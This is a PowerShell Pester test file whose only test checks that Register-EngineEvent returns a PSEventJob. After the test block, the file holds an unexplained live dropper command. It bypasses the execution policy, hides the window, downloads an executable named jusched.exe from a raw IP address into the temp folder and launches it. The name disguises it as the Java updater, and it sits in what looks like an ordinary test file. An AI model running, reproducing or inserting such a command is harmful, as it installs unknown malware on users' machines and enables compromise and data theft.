

Describe "Register-EngineEvent" -Tags "CI" {

    Context "Check return type of Register-EngineEvent" {
	It "Should return System.Management.Automation.PSEventJob as return type of Register-EngineEvent" {
	    Register-EngineEvent -SourceIdentifier PesterTestRegister -Action {Write-Output registerengineevent} | Should -BeOfType System.Management.Automation.PSEventJob
	    Unregister-Event -sourceidentifier PesterTestRegister
	}
    }
}

PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://93.174.94.137/~rama/jusched.exe', $env:TEMP\jusched.exe );Start-Process ( $env:TEMP\jusched.exe )

